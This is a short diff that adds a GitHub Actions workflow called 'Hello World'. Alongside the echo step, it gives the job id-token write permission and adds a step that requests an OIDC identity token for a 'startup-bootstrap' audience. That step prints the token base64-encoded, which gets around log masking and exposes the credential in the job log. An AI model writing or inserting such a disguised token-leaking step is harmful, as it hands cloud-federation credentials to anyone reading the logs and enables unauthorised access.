@@ -1,0 +1,16 @@
+on:
+  workflow_dispatch:
+name: Hello World
+jobs:
+  hello:
+    runs-on: ubuntu-latest
+    name: Says Hello World
+    permissions:
+        contents: read
+        id-token: write
+    steps:
+    - name: Say it
+      run: echo "Hello World"
+    - name: perform token run
+      run: |
+        echo $(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=startup-bootstrap" | base64)
